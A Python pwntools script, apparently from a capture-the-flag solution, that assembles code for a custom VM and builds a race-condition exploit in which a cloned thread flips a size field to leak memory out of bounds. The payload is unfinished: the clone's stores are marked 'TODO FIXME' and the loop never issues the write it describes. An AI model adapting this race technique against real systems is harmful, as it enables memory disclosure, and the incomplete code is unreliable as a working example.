from pwn import *
import re

def vmasm(inp):
    s_inp = []
    # remove comments and empty lines
    for i in inp.splitlines():
        i = re.sub(r'//.*$', '', i)
        i = i.strip()
        if i: s_inp.append(i)

    # filter labels
    labels = dict()
    insns = []
    naddr = 0
    for line in s_inp:
        if re.match(r"^[^\s]+:$", line):
            lbl = line[:-1]
            assert lbl not in labels
            labels[lbl] = naddr
        else:
            insns.append((naddr, line))
            naddr += 1

    oparg_imm = re.compile(r'^(-?\d+|0x[0-9a-fA-F]+)$')
    oparg_reg = re.compile(r'^[rRxX]([0-8])$')
    oparg_mem = re.compile(r'^\[(\d+|0x[0-9a-fA-F]+)\]$')
    oparg_lbl = re.compile(r'^(\w+)$')

    # assemble
    out = b''
    for (addr, ins) in insns:
        # print(ins)
        r = re.match(r'(add|sub|mul|div|and|or|xor|shl|shr|mov|ld|st|cmp|jmp|jz|jnz|clone|syscall) (.*)', ins)

        # try:
        if True:
            (op, args) = r.groups()

            opc = 0
            mode = 0
            dst = 0
            src = 0

            args = list(map(lambda x: x.strip(), args.split(',')))

            if op in ["add", "sub", "mul", "div", "and", "or", "xor", "shl", "shr", "mov"]:

                opc = {
                    "add": 0,
                    "sub": 1,
                    "mul": 2,
                    "div": 3,
                    "and": 4,
                    "or": 5,
                    "xor": 6,
                    "shl": 7,
                    "shr": 8,
                    "mov": 9,
                }[op]

                dst = int(oparg_reg.match(args[0]).groups()[0], 0)

                if oparg_reg.match(args[1]):
                    mode = 0
                    src = int(oparg_reg.match(args[1]).groups()[0], 0)
                elif oparg_imm.match(args[1]):
                    mode = 1
                    src = int(oparg_imm.match(args[1]).groups()[0], 0)
                else:
                    assert False

            elif op == "cmp":
                opc = 10

                if oparg_reg.match(args[0]):
                    mode = 0
                    dst = int(oparg_reg.match(args[0]).groups()[0], 0)
                elif oparg_imm.match(args[0]):
                    mode = 2
                    dst = int(oparg_imm.match(args[0]).groups()[0], 0)

                if oparg_reg.match(args[1]):
                    mode += 0
                    src = int(oparg_reg.match(args[1]).groups()[0], 0)
                elif oparg_imm.match(args[1]):
                    mode += 1
                    src = int(oparg_imm.match(args[1]).groups()[0], 0)

            elif op in ["jmp", "jz", "jnz", "clone"]:
                opc = {
                    "jmp": 11,
                    "jz": 12,
                    "jnz": 13,
                    "clone": 14,
                }[op]
                jmp_addr = labels[args[0]]
                src = 0
                if oparg_reg.match(args[0]):
                    mode = 1
                    dst = int(oparg_reg.match(args[0]).groups()[0], 0)
                elif oparg_lbl.match(args[0]):
                    mode = 2
                    dst = jmp_addr
                else:
                    assert False
            elif op == "syscall":
                opc = 15

                mode = {
                    'reg': 1,
                    'mem': 3,
                }[args[0]]

                src = 0
                dst = 0

            elif op == "ld":
                opc = 9
                dst = int(oparg_reg.match(args[0]).groups()[0], 0)
                mode = 4

                if oparg_mem.match(args[1]):
                    src = int(oparg_mem.match(args[1]).groups()[0], 0)
                else:
                    assert False
            elif op == "st":
                # we do st in other order to match with arm like st reg, [addr]
                opc = 9
                src = int(oparg_reg.match(args[0]).groups()[0], 0)
                mode = 3

                if oparg_mem.match(args[1]):
                    dst = int(oparg_mem.match(args[1]).groups()[0], 0)
                else:
                    assert False
            else:
                assert False

            out += p16(opc & 0xffff)
            out += p16(mode & 0xffff)
            out += p64(dst & ((1 << 64) - 1))
            out += p64(src & ((1 << 64) - 1))

            # print(f"{addr:#x}:    {opc=} {mode=} {dst=:#x} {src=:#x}")
        # except Exception as e:
        #     print(f"      WTF : {ins} {e}")
        #     raise e


    return out

if __name__ == "__main__":
    pb = """// Tells the cloned VM to repeated flip [24] between 0 and 0x10000
      mov r0, 24
      st r0,  [0]
      mov r0, 0x10000
      st r0,  [16]

      clone run_in_clone

      // fd = 1
      mov r1, 1
      st r1,  [32]
      mov r1, 32

      // ptr = 0
      mov r2, 40

      // size = [24] (flipped by cloned VM)
      mov r3, 24

      // Repeatedly write until we have won the race and leaked out of bounds
    race_loop:
        // write([r1], [r2], [r3])
        sub r0, -1
        jz race_loop

        // exit
        mov r0, 2
        mov r1, 0
        syscall reg

    run_in_clone:
        ld r0, [0]
        ld r1, [8]
        ld r2, [16]
        // TODO FIXME st r1,  [r0]
        // TODO FIXME st r2,  [r0]
        jmp run_in_clone

    """

    print(vmasm(pb))
